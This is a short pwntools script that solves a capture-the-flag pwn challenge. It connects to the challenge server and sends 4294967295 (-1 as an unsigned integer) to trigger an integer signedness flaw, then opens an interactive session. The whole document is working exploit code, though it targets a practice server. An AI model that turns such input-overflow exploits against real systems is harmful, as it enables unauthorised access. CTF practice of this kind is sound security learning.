from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28113)
io.sendline('4294967295')  # -1
io.interactive()
